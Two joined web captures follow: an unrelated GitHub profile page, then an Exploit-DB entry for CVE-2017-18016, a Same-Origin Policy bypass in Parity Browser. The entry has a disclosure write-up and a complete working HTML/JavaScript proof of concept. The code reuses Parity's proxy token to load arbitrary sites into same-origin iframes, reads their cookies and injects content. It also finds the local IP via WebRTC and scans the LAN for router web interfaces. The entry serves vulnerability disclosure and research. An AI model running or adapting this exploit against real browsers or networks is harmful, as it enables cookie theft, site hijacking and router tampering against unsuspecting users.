=== Content from github.com_962c2038_20250126_022641.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftintin)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftintin)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@tintin](https://avatars.githubusercontent.com/u/160243?s=64&v=4)

**tintin**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftintin)

[Overview](/tintin)
[Repositories
2](/tintin?tab=repositories)
[Projects
0](/tintin?tab=projects)
[Packages
0](/tintin?tab=packages)
[Stars
2](/tintin?tab=stars)

More

* [Overview](/tintin)
* [Repositories](/tintin?tab=repositories)
* [Projects](/tintin?tab=projects)
* [Packages](/tintin?tab=packages)
* [Stars](/tintin?tab=stars)

![@tintin](https://avatars.githubusercontent.com/u/160243?s=64&v=4)

**tintin**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftintin)

[![View tintin's full-sized avatar](https://avatars.githubusercontent.com/u/160243?v=4)](https://avatars.githubusercontent.com/u/160243?v=4)

# tintin

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftintin)

[3
followers](https://github.com/tintin?tab=followers) · [0
following](https://github.com/tintin?tab=following)

Block or Report

# Block or report tintin

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user’s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=tintin+%28user%29)

[Overview](/tintin)
[Repositories
2](/tintin?tab=repositories)
[Projects
0](/tintin?tab=projects)
[Packages
0](/tintin?tab=packages)
[Stars
2](/tintin?tab=stars)

More

* [Overview](/tintin)
* [Repositories](/tintin?tab=repositories)
* [Projects](/tintin?tab=projects)
* [Packages](/tintin?tab=packages)
* [Stars](/tintin?tab=stars)

## Popular repositories Loading

1. [android-ameo](/tintin/android-ameo) android-ameo
   Public

   android port for ameo

   [1](/tintin/android-ameo/stargazers)
2. [android-athena](/tintin/android-athena) android-athena
   Public

   Forked from [bqwd36/android-athena](/bqwd36/android-athena)

   Google Android ported to the HTC Athena

   C

   [1](/tintin/android-athena/stargazers)
   [1](/tintin/android-athena/forks)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.exploit-db.com_e67efc2d_20250124_170234.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Parity Browser < 1.6.10 - Bypass Same Origin Policy

#### EDB-ID:

###### 43499

#### CVE:

###### [2017-18016](https://nvd.nist.gov/vuln/detail/CVE-2017-18016)

---

**EDB Verified:**

#### Author:

###### [tintinweb](/?author=7621)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2018-01-10

---

**Vulnerable App:**

```
VuNote
======

    Author:     <github.com/tintinweb>
    Ref:        https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-18016
    Version:    0.3
    Date:       Jun 16th, 2017

    Tag:        parity same origin policy bypass webproxy token reuse

Overview
--------

    Name:           parity
    Vendor:         paritytech
    References:     * https://parity.io/ [1]

    Version:        1.6.8
    Latest Version: 1.7.12 (stable) - fixed
                    1.8.5 (beta) - fixed
    Other Versions: <= 1.6.10 (stable) - vulnerable
    Platform(s):    cross
    Technology:     rust js

    Vuln Classes:   CWE-346
    Origin:         local (remote website, malicious dapp)
    Min. Privs.:    ---

    CVE:            CVE-2017-18016

Description
---------

quote website [1]

>Parity Technologies is proud to present our powerful new Parity Browser. Integrated directly into your Web browser, Parity is the fastest and most secure way of interacting with the Ethereum network.

Summary
-------

PoC: https://tintinweb.github.io/pub/pocs/cve-2017-18016/ [4]

> Parity Browser <=1.6.8 allows remote attackers to bypass the Same Origin Policy and obtain sensitive information by requesting other websites via the Parity web proxy engine (reusing the current website's token, which is not bound to an origin).

![parity cookie](sop_cookie.gif)

**(A)** Ethereum Parity's built-in dapp/web-browsing functionality is
rendering browser same-origin policy (SOP) ineffective by proxying
requests with the parity main process. As a result, any website
navigated to ends up being origin http://localhost:8080. This also means
that all websites navigated to share the same origin and thus are not
protected by the browser SOP allowing any proxied website/dapp to access
another proxied website/dapp's resources (Cookies, ...).

//see attached PoC - index.html / PoC

![parity frame](sop_frame.gif)

**(B)** Worse, due to the structure of proxy cache urls and the fact that they
contain a reusable non-secret non-url specific cache-token it is
possible for one proxied website/dapp to navigate to any other proxied
website/dapp gaining full script/XHR control due to **(A)** the SOP being
applied without any restrictions. This could allow a malicious
website/dapp to take control of another website/dapp, performing user
interactions, XHR or injecting scripts/DOM elements to mislead the
user or to cause other unspecified damage.

When navigating to a website with the built-in parity webbrowser a webproxy request
token is requested and sent along an encoded request for an url. For example, navigating
parity to http://oststrom.com the url gets turned into a proxy url like http://127.0.0.1:8080/web/8X4Q4EBJ71SM2CK6E5AQ6YBNB4NPGX3ME0X2YBVFEDT76X3JDXPJWRVFDM of
the form http://127.0.0.1:8080/web/[base32_encode(token+url)]. A malicious dapp can use
this information to decode its own url, extract the token and reuse it for any other
url as the token is not locked to the url. The PoC exploits this in order to load any
other website into a same-origin iframe by reusing the proxy token.

Code see [2]

//see attached PoC - index.html / PoC

Proof of Concept
----------------

Prerequisites:

* (if hosted locally) modify /etc/hosts to resolve your testdomain to your webserver
* make `index.html` accessible on a webserver (e.g. `cd /path/to/index.html; python -m SimpleHTTPServer 80`)

1. launch parity, navigate to the built-in webbrowser (http://127.0.0.1:8180/#/web)
2. navigate the built-in parity webbrowser to where the PoC `index.html` is hosted (e.g. [4])
3. follow the instructions.
4. Issue 1: navigate to some websites to have them set cookies, reload the PoC page and click "Display Cookies". Note that while the main request is proxied by parity, subsequent calls might not be (e.g. xhr, resources). That means you'll only see cookies set by the main site as only the initial call shares the origin `localhost:8080`.
5. Issue 2: enter an url into the textbox and hit `Spawn SOP Iframe`. A new iframe will appear on the bottom of the page containing the proxied website. Note that the calling website has full script/dom/xhr access to the proxied target. You can also use the "Display Cookies" button from Issue 1 to show cookies that have been merged into the origin by loading the proxied iframe.
6. Demo 2: Just a PoC to find local-lan web interfaces (e.g. your gateways web interface) and potentially mess with its configuration (e.g. router with default password on your lan being reconfigured by malicious dapp that excploits the token reuse issue 2)

//tested with latest chrome

Notes
-----

* Commit [3] (first in 1.7.0)
* Does not fix Issue #1 - sites are generally put into same origin due to proxy
* Fixes Issue #2 - Token Reuse
* Parity now added a note that browsing websites with their browser is insecure

![parity fixed](v171.png)

* Issue #1 is not yet fixed as the cookie of instagram.com is still shown.
* Parity v1.7.12 added a note.

Timeline
--------

    31.05.2017 - first contact, forwarded to parity
    17.06.2017 - provided PoC
    19.06.2017 - response: not critical issue due to internal browser being a dapp browser and not a generic web browser
    20.06.2017 - provided more information
    21.06.2017 - response: not critical issue due to internal browser being a dapp browser and not a generic web browser
    21.06.2017 - response: follow-up - looking into means to lock the token to a website
    22.06.2017 - fix ready [3]
    10.01.2018 - public disclosure

References
----------

    [1] https://parity.io/
    [2] https://github.com/paritytech/parity/blame/e8b418ca03866fd952d456830b30e9225c81035a/dapps/src/web.rs
    [3] https://github.com/paritytech/parity/commit/53609f703e2f1af76441344ac3b72811c726a215
    [4] https://tintinweb.github.io/pub/pocs/cve-2017-18016/

Contact
-------

    https://github.com/tintinweb

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="cve-2017-18016 paritytech parity same origin policy bypass sop">
    <meta name="author" content="github.com/tintinweb">
    <!--<link rel="icon" href="favicon.ico">-->

    <title>Ethereum | Parity SOP Vulnerability</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

	<script type="text/javascript">
	;(function(){

	// This would be the place to edit if you want a different
	// Base32 implementation

	var alphabet = '0123456789ABCDEFGHJKMNPQRSTVWXYZ'.toLowerCase()
	var alias={}
	//var alias = { o:0, i:1, l:1, s:5 }

	/**
	 * Build a lookup table and memoize it
	 *
	 * Return an object that maps a character to its
	 * byte value.
	 */

	var lookup = function() {
		var table = {}
		// Invert 'alphabet'
		for (var i = 0; i < alphabet.length; i++) {
			table[alphabet[i]] = i
		}
		// Splice in 'alias'
		for (var key in alias) {
			if (!alias.hasOwnProperty(key)) continue
			table[key] = table['' + alias[key]]
		}
		lookup = function() { return table }
		return table
	}

	/**
	 * A streaming encoder
	 *
	 *     var encoder = new base32.Encoder()
	 *     var output1 = encoder.update(input1)
	 *     var output2 = encoder.update(input2)
	 *     var lastoutput = encode.update(lastinput, true)
	 */

	function Encoder() {
		var skip = 0 // how many bits we will skip from the first byte
		var bits = 0 // 5 high bits, carry from one byte to the next

		this.output = ''

		// Read one byte of input
		// Should not really be used except by "update"
		this.readByte = function(byte) {
			// coerce the byte to an int
			if (typeof byte == 'string') byte = byte.charCodeAt(0)

			if (skip < 0) { // we have a carry from the previous byte
				bits |= (byte >> (-skip))
			} else { // no carry
				bits = (byte << skip) & 248
			}

			if (skip > 3) {
				// not enough data to produce a character, get us another one
				skip -= 8
				return 1
			}

			if (skip < 4) {
				// produce a character
				this.output += alphabet[bits >> 3]
				skip += 5
			}

			return 0
		}

		// Flush any remaining bits left in the stream
		this.finish = function(check) {
			var output = this.output + (skip < 0 ? alphabet[bits >> 3] : '') + (check ? '$' : '')
			this.output = ''
			return output
		}
	}

	/**
	 * Process additional input
	 *
	 * input: string of bytes to convert
	 * flush: boolean, should we flush any trailing bits left
	 *        in the stream
	 * returns: a string of characters representing 'input' in base32
	 */

	Encoder.prototype.update = function(input, flush) {
		for (var i = 0; i < input.length; ) {
			i += this.readByte(input[i])
		}
		// consume all output
		var output = this.output
		this.output = ''
		if (flush) {
		  output += this.finish()
		}
		return output
	}

	// Functions analogously to Encoder

	function Decoder() {
		var skip = 0 // how many bits we have from the previous character
		var byte = 0 // current byte we're producing

		this.output = ''

		// Consume a character from the stream, store
		// the output in this.output. As before, better
		// to use update().
		this.readChar = function(char) {
			if (typeof char != 'string'){
				if (typeof char == 'number') {
					char = String.fromCharCode(char)
				}
			}
			char = char.toLowerCase()
			var val = lookup()[char]
			if (typeof val == 'undefined') {
				// character does not exist in our lookup table
				return // skip silently. An alternative would be:
				// throw Error('Could not find character "' + char + '" in lookup table.')
			}
			val <<= 3 // move to the high bits
			byte |= val >>> skip
			skip += 5
			if (skip >= 8) {
				// we have enough to preduce output
				this.output += String.fromCharCode(byte)
				skip -= 8
				if (skip > 0) byte = (val << (5 - skip)) & 255
				else byte = 0
			}

		}

		this.finish = function(check) {
			var output = this.output + (skip < 0 ? alphabet[bits >> 3] : '') + (check ? '$' : '')
			this.output = ''
			return output
		}
	}

	Decoder.prototype.update = function(input, flush) {
		for (var i = 0; i < input.length; i++) {
			this.readChar(input[i])
		}
		var output = this.output
		this.output = ''
		if (flush) {
		  output += this.finish()
		}
		return output
	}

	/** Convenience functions
	 *
	 * These are the ones to use if you just have a string and
	 * want to convert it without dealing with streams and whatnot.
	 */

	// String of data goes in, Base32-encoded string comes out.
	function encode(input) {
	  var encoder = new Encoder()
	  var output = encoder.update(input, true)
	  return output
	}

	// Base32-encoded string goes in, decoded data comes out.
	function decode(input) {
		var decoder = new Decoder()
		var output = decoder.update(input, true)
		return output
	}

	/**
	 * sha1 functions wrap the hash function from Node.js
	 *
	 * Several ways to use this:
	 *
	 *     var hash = base32.sha1('Hello World')
	 *     base32.sha1(process.stdin, function (err, data) {
	 *       if (err) return console.log("Something went wrong: " + err.message)
	 *       console.log("Your SHA1: " + data)
	 *     }
	 *     base32.sha1.file('/my/file/path', console.log)
	 */

	var crypto, fs
	function sha1(input, cb) {
		if (typeof crypto == 'undefined') crypto = require('crypto')
		var hash = crypto.createHash('sha1')
		hash.digest = (function(digest) {
			return function() {
				return encode(digest.call(this, 'binary'))
			}
		})(hash.digest)
		if (cb) { // streaming
			if (typeof input == 'string' || Buffer.isBuffer(input)) {
				try {
					return cb(null, sha1(input))
				} catch (err) {
					return cb(err, null)
				}
			}
			if (!typeof input.on == 'function') return cb({ message: "Not a stream!" })
			input.on('data', function(chunk) { hash.update(chunk) })
			input.on('end', function() { cb(null, hash.digest()) })
			return
		}

		// non-streaming
		if (input) {
			return hash.update(input).digest()
		}
		return hash
	}
	sha1.file = function(filename, cb) {
		if (filename == '-') {
			process.stdin.resume()
			return sha1(process.stdin, cb)
		}
		if (typeof fs == 'undefined') fs = require('fs')
		return fs.stat(filename, function(err, stats) {
			if (err) return cb(err, null)
			if (stats.isDirectory()) return cb({ dir: true, message: "Is a directory" })
			return sha1(require('fs').createReadStream(filename), cb)
		})
	}

	var base32 = {
		Decoder: Decoder,
		Encoder: Encoder,
		encode: encode,
		decode: decode,
		sha1: sha1
	}

	if (typeof window !== 'undefined') {
	  // we're in a browser - OMG!
	  window.base32 = base32
	}

	if (typeof module !== 'undefined' && module.exports) {
	  // nodejs/browserify
	  module.exports = base32
	}
	})();
	</script>

	<script type="text/javascript">
	function new_parity_proxy_url(destination){
		//get current webproxy token (we'll just be reusing this one)
		var url_decoded = base32.decode(document.location.search.match(/web\/(.*)$/)[1]);
		var token = url_decoded.split("+")[0];
		console.log(document.location);
		console.log(url_decoded);
		console.log(token);
		console.log(token + "+" + destination);
		var new_url = document.location.origin + "/web/" + base32.encode(token + "+" + destination).toUpperCase();
		console.log(new_url);
		return new_url;
	}

	function sop_iframe_inject (destination){
		d = document.createElement("div");
		d.id=destination;
		d.style="border-style: dashed";
		document.body.appendChild(d);

		d_data = document.createElement("div");

		i = document.createElement("iframe");
		i.sandbox = "allow-same-origin allow-forms allow-pointer-lock allow-scripts allow-popups allow-modals";
		i.style = "resize: both; overflow: auto;"
		d.appendChild(i);
		d.appendChild(d_data);
		var proxied_url = new_parity_proxy_url(destination);
		i.onload = function() {
			//fix the document removing the injection script

			var doc = i.contentWindow.document;
			var doc_html = doc.documentElement.outerHTML;
			doc_html = doc_html.replace("<script src=\"\/parity-utils\/inject.js\"><\/script>","").replace("<\/head><body style=\"background-color: #FFFFFF;\">","");
			doc.open();
			doc.write(doc_html);
			doc.close();

		   i.contentDocument.head.innerHTML = "<title>INJECTED</title>";
		   // just do anything
		   i.contentDocument.body.prepend("!--> Injected from parent frame!");
		   d_data.innerHTML = "<br><br>";
		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] we have full control over iframe:'+destination+'</div>';
		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] Child Frames Cookie value: <pre>' + i.contentDocument.cookie + '<pre></div>';
		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] Child Frames dom title: <pre>' + i.contentDocument.head.title + '<pre></div>';
		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] Child Frames window.location.href: <pre>' + i.contentWindow.location.href + '<pre></div>';
		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] we have prepended a body element :<b>!--> Injected from parent frame!</b></div>';
		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] we have removed inject.js from the target frame:'+destination+'<br></div>';
		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] source (via xhr): <textarea>'+getUrl(proxied_url).responseText+'</textarea></div>';
		};

		//navigate to url (poor mans location setter :p)
		i.contentWindow.location.replace(proxied_url);
	}

	function get_lan_ip(cb){
		window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;   //compatibility for firefox and chrome
		var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};
		pc.createDataChannel("");    //create a bogus data channel
		pc.createOffer(pc.setLocalDescription.bind(pc), noop);    // create offer and set local description
		pc.onicecandidate = function(ice){  //listen for candidate events
			if(!ice || !ice.candidate || !ice.candidate.candidate)  return;
			var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
			cb(myIP);
			pc.onicecandidate = noop;
		};
	}

	function getUrl(url){
		var xhr = new XMLHttpRequest;
		xhr.open('GET', url, false); //synchronous.
		xhr.send();
		return xhr;
	};

	function find_local_web_interfaces(){
		get_lan_ip(function(local_ip){
			/** find routers on local lan segment
			try .1 and .254 first, otherwise bruteforce
			**/
			var local_ip_netpart = local_ip.split(".").slice(0,3).join(".")
			console.log("your local ip: "+local_ip);
			console.log("testing lan segment: " + local_ip_netpart);

			function get_candidate_ips(base){
				var ret = new Array();
				ret.push(1);
				ret.push(254);
				for(var i=2; i<254; i++){
				   ret.push(i);
				}
				return ret;
			}

			var candidate_ips = get_candidate_ips();

			for (i=0;i<candidate_ips.length;i++){
				//synchronously. avoid dos'ing parity prx
				var probe_ip = local_ip_netpart + "." + candidate_ips[i];
				console.log("probing "+probe_ip);
				var parity_probe_url = new_parity_proxy_url("http://"+probe_ip);
				if (getUrl(parity_probe_url).status<400){
					console.log("HIT! - "+probe_ip+" is available! " +parity_probe_url);
					sop_iframe_inject(parity_probe_url);
					if (document.getElementById("stop_on_first_hit").checked) return;
				}
			}
		});
	}

	</script>
</head>
<body>
 <!-- Fixed navbar -->
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">Parity Vulnerability</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li class="active"><a href="#">Home</a></li>
            <li><a href="#contact">Contact</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>

    <div class="container theme-showcase" role="main">

      <!-- Main jumbotron for a primary marketing message or call to action -->
      <div class="jumbotron">
        <h1>Parity SOP Bypass</h1>
        <p>Same-Origin Policy Bypass in Parity's Dapp Browser</p>
      </div>
	  <div class="well">
        <p>
        <b>Disclaimer</b>
        <pre>/* This program is free software. It comes without any warranty, to
 * the extent permitted by applicable law. You can redistribute it
 * and/or modify it under the terms of the GNU General Public License,
 * Version 2, as published by the Free Software Foundation. See
 * github.com/tintinweb/pub/tree/master/pocs/cve-2017-18016/
 * for more details. */ </pre></p>
      </div>
	  <p>
        <button type="button" class="btn btn-primary" onclick="alert('Ok, thanks ;)')">I agree!</button>
      </p>

	<div class="jumbotron">
		<h1 class="display-4">Issue #1</h1>
		<p class="lead">Same-Origin Policy (SOP) bypass vulnerability due to parity proxying websites</p>
		<hr class="my-4">
		<div>
			Every webpage you browse to with parity's built-in browser (http://127.0.0.1:8180/#/web) is proxied via http://127.0.0.1:8080.
			For example, when you browse to
			<ul>
				<li>http://google.com's the websites origin changes to 127.0.0.1:8080.</li>
				<li>Navigating to http://oststrom.com changes the origin to 127.0.0.1:8080 as it is proxied via parity.</li>
			</ul>
			Both websites therefore share the same origin rendering a core feature of modern web browsers - the <b>Same-Origin Policy</b> - ineffective.
			A website is same-origin if <b>proto, host and port</b> (iexplore does not check port) match.
			Bypassing the SOP gives full control over XHR and DOM of child nodes (including iframe source) with the same origin.
		</div>
		<div class="alert alert-warning" role="alert">
			<span class="badge badge-warning">Warning</span> This means, as there's only <u>one origin for all websites</u>, non domain restricted cookies are effectively shared with all websites.
		</div>
		<b><span class="badge badge-primary">DEMO #1</span> Cookies shared with other websites</b>
		<ul>
		   <li>1) using parity's built-in browser, navigate to any website to set a cookie (e.g. http://google.com)</li>
		   <li>2) reload this this PoC (https://tintinweb.github.io/pub/pocs/cve-2017-18016/) </li>
		   <li>3) hit the <b>Display Cookies</b> button</li>
		</ul>
		<p class="lead">
			<textarea id="txtdomcookie"></textarea><br>
			<a class="btn btn-primary btn-lg" role="button" onclick="document.getElementById('txtdomcookie').value=document.cookie">Display Cookies</a>
		</p>
	</div>
	<div class="jumbotron">
		<h1 class="display-4">Issue #2</h1>
		<p class="lead">Parity WebProxy Token Reuse vulnerability</p>
		<hr class="my-4">
		<div>When navigating to a website with the built-in parity webbrowser a webproxy request token is requested and sent along an encoded request for an url. For example, navigating parity to http://oststrom.com the url gets turned into a proxy url like http://127.0.0.1:8080/web/8X4Q4EBJ71SM2CK6E5AQ6YBNB4NPGX3ME0X2YBVFEDT76X3JDXPJWRVFDM of the form http://127.0.0.1:8080/web/[base32_encode(token+url)].</div>

		<br>

		<div class="alert alert-warning" role="alert">
			<span class="badge badge-warning">Warning</span> When navigating to http://oststrom.com the website can detect that it has been proxied by checking the location.href.
			It can further base32 decode and extract the web-proxy token and simply reuse it as the token is not bound to any specifiy request url or hostname allowing any website to create proxy urls and navigate to any other website.
		</div>
		<div class="alert alert-info" role="alert">
			<span class="badge badge-info">Info</span> The parity webbrowser does not allow a proxied website to change the top frames location or open new windows (iframe sandbox).
		</div>
		<div class="alert alert-warning" role="alert">
			<span class="badge badge-warning">Warning</span> However, it allows to perform XHR or embed iframes with script access to proxied locations of arbitrary websites. This allows one website to control any other website since they're both same origin (Issue 1).
		</div>
		<div class="alert alert-info" role="alert">
			<span class="badge badge-info">Info</span> The controlling website has full scripting access to sub-iframes potentially allowing for service enumeration attacks or simulate user interaction.
		</div>
		<br><br>
		<b><span class="badge badge-primary">DEMO #2</span> Full control of arbitrary websites via token reuse and SOP bypass</b>
		 <ul>
		   <li>1) enter url into the textbox</li>
		   <li>2) hit <b>Spawn SOP Iframe</b></li>
		 </ul>
		<b>Notes:</b>
		 <ul>
		   <li><span class="badge badge-light">Note</span> the current page can modify/inject arbitrary DOM/scripting into the iframe, access cookies (only the ones stored for 127.0.0.1, potentially from prevs sessions with parity), manipulate change and reload the websites content (e.g. removing parity's inject.js), get the source via XHR</li>
		   <li><span class="badge badge-light">Note</span> some websites may not load due to js errors. However, since the website has full control it is likely the calling website can fix any js errors occuring in the subframe.</li>
		   <li><span class="badge badge-light">Note</span> Untested but likely possible: Prepare a transaction to send off ether via parity/web3 api or xhr, open an iframe or perform requests to directly authorize (may require unlock secret) or redress the UI to clickjack the authorization or perform other actions messing with the users account</li>
		 </ul>
		 <br>
		 <p class="lead">
			<a class="btn btn-primary btn-lg" role="button" onclick="sop_iframe_inject(document.getElementById('dst').value)">Spawn SOP Iframe</a>
			<input type=text value="http://myetherwallet.com" id="dst">
		</p>

		 <br><br>
		 <b><span class="badge badge-primary">DEMO #3</span> (Chrome) get local lan ip and service scan for web-enabled devices on the LAN to mess with them</b><br>
		 e.g. search for local router interfaces with default passwords and reconfigure it to perform DNS based redirection attacks (mitm) or similar
		 <ul>
		   <li>1) click 'Find LAN-Local WebInterfaces' to scan for devices listening on http port 80 within your LAN (IP .1 to .254)</li>
		   <li>2) an iframe with full control will be created for each device found on the lan</li>
		   <li>Note: might require some fixups for the iframe conted to be loaded completely due to parity webproxy messing with header scripts or websites unable to be loaded via iframes. XHR should work though and CSRF tokens can be read from XHR requests or iframe dom (if dom based). See javascript console for debug.</li>
		 </ul>

		 <p class="lead">
			<a class="btn btn-primary btn-lg" role="button" onclick="find_local_web_interfaces()">Find LAN-Local WebInterfaces</a>
		</p>
		<input type="checkbox" value="stop_on_first_hit" name="stop_on_first_hit" id="stop_on_first_hit"><label for="stop_on_first_hit">Stop on first device</label>

	</div>

      <div class="page-header">
        <h1 id="contact">Contact</h1>
      </div>
      <div>
		<a href="https://github.com/tintinweb">//tintinweb</a>
      </div>
    </div> <!-- /container -->
</body>
</html>

```

**Tags:**

**Advisory/Source:**
[Link](https://github.com/tintinweb/pub/tree/352d69d518b9b9c0f4983f1254418f0e9755cbb2/pocs/cve-2017-18016)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
